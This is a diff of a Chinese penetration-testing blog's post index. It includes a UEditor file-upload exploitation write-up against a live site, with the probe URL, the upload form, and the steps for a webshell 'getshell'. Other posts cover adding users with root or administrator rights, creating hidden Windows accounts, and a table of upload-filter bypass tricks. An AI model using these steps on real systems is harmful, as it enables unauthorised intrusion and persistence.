+<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" alt="image-20210810151439843" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" class="lozad post-image"></p>
+<p>注：必须为公网服务器</p>
+<p>5、返回图片马路径</p>
+<p>应为<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code></p>
+<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" alt="image-20210730090908140" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" class="lozad post-image"></p>
+<p>6、蚁剑连接，getshell</p>
+<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" alt="image-20210810151458628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" class="lozad post-image"></p>
+<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>这里补充下上传拦截规则，前面提到，发现过其他上传入口，也上传过aspx图片马，这里只做了Content-Type，即文件类型检测。编辑器这里也一样。对于文件上传漏洞来说，没什么难度，对于Ueditor编辑器漏洞来说，这里还有几个坑点。</p>
+<p>1、服务器必须为国内公网服务器，不然会上传失败。</p>
+<p>2、返回的路径<code>/upload/image/20210729/6376...09895.aspx</code>为当前目录下的路径，即<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code>,前面如有路径都应加上，而不是根目录下的upload路径。</p>
+<p>3、到这里忽然想起来，第三个上传点，当时传上去了，但是没有找到路径，就没有继续做，没想到传到这里来了<img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" alt="image-20210810151516892" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" class="lozad post-image"></p>
+<p>哦对，根目录下发现一个K8脱库大马，尝试密码K8team成功进入，然后顺手提交了挂马漏洞。嗯，作为一名白帽子，一定要从入门开始养成习惯。</p>
+<p> <img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" alt="image-20210730092037287" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" class="lozad post-image"></p>
+<p>————————————————————————————————————————————————————————————</p>
+<p>嗯，洞没过，大意了。补天先过了挂马洞，编辑器洞来回折腾了几天。然后，编辑器洞和挂马洞一起被修了，提交失败。害~利人不利己。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Ueditor</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web渗透随记</title>
     <url>/article/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
@@ -5275,53 +5322,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Ueditor漏洞复现</title>
-    <url>/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>闲来无事，逛逛补天。随机选取一个不要钱的幸运儿，fofa资产收集，发现一个域名下，存在目录遍历漏洞。emmm，暴露无遗呀，不拿下简直对不起这个遍历漏洞。众多备份文件，嗯，不会逆向源码，放过；一个上传入口，一个传了没执行权限，一个接口错误，一个不记得了。。。年龄大了，一晚上过去就忘记了，嘤嘤嘤。好了，继续，发现一个usditor编辑器，百度一波，其实是百度的ueditor富文本编辑器。现学现卖，开始。</p>
-<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" alt="image-20210730085813949" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" class="lozad post-image"></p>
-<h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>1、发现存在ueditor文本编辑器</p>
-<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" alt="image-20210810151403335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" class="lozad post-image"></p>
-<p>2、漏洞探测</p>
-<p>访问url</p>
-<pre class="highlight"><span class="line">/usditor/net/controller.ashx?action=catchimage</span><br></pre>
-
-<p>返回</p>
-<pre class="highlight"><span class="line">&#123;&quot;state&quot;:&quot;参数错误：没有指定抓取源&quot;&#125;</span><br></pre>
-
-<p>说明存在编辑器文件上传漏洞。</p>
-<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" alt="image-20210730090222390" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" class="lozad post-image"></p>
-<p>3、构造上传入口</p>
-<pre class="highlight"><span class="line">&lt;form action=&quot;xx/usditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>
-
-<p>注：action的通用地址应为：</p>
-<pre class="highlight"><span class="line">http://xxx.com/ueditor/net/controller.ashx?action=catchimage</span><br></pre>
-
-<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" alt="image-20210810151430644" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" class="lozad post-image"></p>
-<p>4、上传公网服务器aspx图片马，并用<code>?.aspx</code>连接，即<code>http://x/x.jpg?.aspx</code></p>
-<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" alt="image-20210810151439843" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" class="lozad post-image"></p>
-<p>注：必须为公网服务器</p>
-<p>5、返回图片马路径</p>
-<p>应为<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code></p>
-<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" alt="image-20210730090908140" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" class="lozad post-image"></p>
-<p>6、蚁剑连接，getshell</p>
-<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" alt="image-20210810151458628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" class="lozad post-image"></p>
-<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>这里补充下上传拦截规则，前面提到，发现过其他上传入口，也上传过aspx图片马，这里只做了Content-Type，即文件类型检测。编辑器这里也一样。对于文件上传漏洞来说，没什么难度，对于Ueditor编辑器漏洞来说，这里还有几个坑点。</p>
-<p>1、服务器必须为国内公网服务器，不然会上传失败。</p>
-<p>2、返回的路径<code>/upload/image/20210729/6376...09895.aspx</code>为当前目录下的路径，即<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code>,前面如有路径都应加上，而不是根目录下的upload路径。</p>
-<p>3、到这里忽然想起来，第三个上传点，当时传上去了，但是没有找到路径，就没有继续做，没想到传到这里来了<img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" alt="image-20210810151516892" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" class="lozad post-image"></p>
-<p>哦对，根目录下发现一个K8脱库大马，尝试密码K8team成功进入，然后顺手提交了挂马漏洞。嗯，作为一名白帽子，一定要从入门开始养成习惯。</p>
-<p> <img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" alt="image-20210730092037287" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" class="lozad post-image"></p>
-<p>————————————————————————————————————————————————————————————</p>
-<p>嗯，洞没过，大意了。补天先过了挂马洞，编辑器洞来回折腾了几天。然后，编辑器洞和挂马洞一起被修了，提交失败。害~利人不利己。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Ueditor</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows随记</title>
     <url>/article/Windows%E9%9A%8F%E8%AE%B0/</url>
     <content><![CDATA[<table>
@@ -5394,55 +5394,6 @@
       </categories>
       <tags>
         <tag>随记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos7搭建DVWA</title>
-    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
-    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
-<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<p>启动apache并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
-
-<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-<p>启动Mysql并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
-
-<p>配置Mysql数据库</p>
-<p>初始化mysql数据库（全部回车确认）</p>
-<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
-
-<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
-
-<p>重启apache使php生效（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<p>配置</p>
-<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
-
-<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
-
-<p>解压并复制到/var/www/html目录</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
-
-<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
-
-<p>创建数据库</p>
-<p>登录（admin:password）</p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
@@ -6081,51 +6032,52 @@
       </tags>
   </entry>
   <entry>
-    <title>创建用户+提权</title>
-    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
-<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
+    <title>centos7搭建DVWA</title>
+    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
+    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
 
-<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
-<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
+<p>启动apache并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
 
-<p>b、然后修改用户，使其属于root组</p>
-<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
+<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
 
-<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
-<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
-<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
+<p>启动Mysql并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
 
-<p>b、使用test账号登录，即可使用sudo权限操作</p>
-<p>如：sudo ls</p>
-<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
-<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
+<p>配置Mysql数据库</p>
+<p>初始化mysql数据库（全部回车确认）</p>
+<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
 
-<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
-<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
+<p>设置mysql密码（非操作系统密码）</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
 
-<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
+<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
 
+<p>重启apache使php生效（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
 
+<p>配置</p>
+<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
 
-<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
+<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
 
-<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
+<p>解压并复制到/var/www/html目录</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
 
-<p>查看管理员组成员</p>
-<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
+<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
 
-<p>删除用户</p>
-<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
-
-<p>禁用用户/启用用户</p>
-<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
+<p>创建数据库</p>
+<p>登录（admin:password）</p>
 ]]></content>
       <categories>
-        <category>Web渗透</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>提权</tag>
+        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
@@ -6180,6 +6132,54 @@
       </categories>
       <tags>
         <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>创建用户+提权</title>
+    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
+<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
+
+<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
+<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
+
+<p>b、然后修改用户，使其属于root组</p>
+<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
+
+<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
+<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
+
+<p>b、使用test账号登录，即可使用sudo权限操作</p>
+<p>如：sudo ls</p>
+<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
+<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
+
+<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
+<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
+
+<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
+
+
+
+<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
+
+<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
+
+<p>查看管理员组成员</p>
+<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
+
+<p>删除用户</p>
+<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
+
+<p>禁用用户/启用用户</p>
+<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -7020,7 +7020,7 @@
 <tr>
 <td align="left">后缀名检测</td>
 <td align="left">黑白名单 上传.xxx文件，通过即为黑名单，不通过为白名单 常见黑名单后缀 php：”.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”, jsp：”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”, asp：”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,,”.cEr”,”.sWf”,”.swf”</td>
-<td align="left">黑名单绕过 <br>1、大小写绕过 linux中，centos6搭载默认apache2.2时可绕过 windows可以绕过 <br> 2、黑名单不全绕过 php：.php3、.phtml asp：.cer、.asmx  <br><br>3、windows系统特性绕过 a.php. a.php (空格) a.php:1 a.php::$DATA</td>
+<td align="left">黑名单绕过 <br>1、大小写绕过 linux中，centos6搭载默认apache2.2时可绕过 windows可以绕过 <br> 2、黑名单不全绕过 php：.php3、.phtml asp：.cer、.asmx  <br><br>3、windows系统特性绕过 a.php. <br>a.php (空格) <br>a.php:1 <br>a.php::$DATA</td>
 </tr>
 <tr>
 <td align="left">内容检测</td>
@@ -7034,7 +7034,7 @@
 </tr>
 <tr>
 <td align="left">解析漏洞</td>
-<td align="left">1、Apache解析漏洞 <br>&gt;多后缀 apache解析顺序从右到左，若是无法解析，则返回源码。 <br>前提：<br>apache1.x、2.x Apache能够识别的文件在mime.types文件可以查看 <br>形式： <br>a.php.xxx.yyy绕过（黑名单绕过） <br>a.php.7z（可绕过白名单–不在apache解析目录，但是在白名单目录） <br><br>&gt;配置错误 apache配置文件可指定解析后缀类型 <br>&gt;.htaccess apache环境下，当上传文件未拦截.htaccess且未重命名文件时，可上传.htaccess修改apache默认配置  <br><br>2、IIS6.0解析漏洞 <br>&gt;目录解析 <br>形式：<br>/xx.asp/xx.jpg <br>原理：<br>在网站下创建文件夹名字为.asp、.asa的文件夹，其目录内的任何扩展名的文件都被当作asp文件来解析并执行。 <br><br>&gt;文件解析 <br>形式：<br>/xx.asp;.jpg（利用特殊符号”;”）<br>原理：<br>在iis6.0下，服务器默认不解析；号后面的内容，所以xx.asp;.jpg被解析为asp脚本解析漏洞 <br><br>&gt;解析文件类型（属于黑名单绕过方式） <br>形式：<br>/test.asa、/test.cer、/test.cdx <br>原理：<br>iis6.0默认的可执行文件除了asp还包含这三种asa、cer、cdx，会将这三种扩展名文件解析为asp文件  <br><br>3、PHP CGI解析漏洞 <br>IIS7.0/IIS7.5/Nginx&lt;0.8.3畸形解析漏洞 <br>前提： <br>1、Fast-CGI运行模式 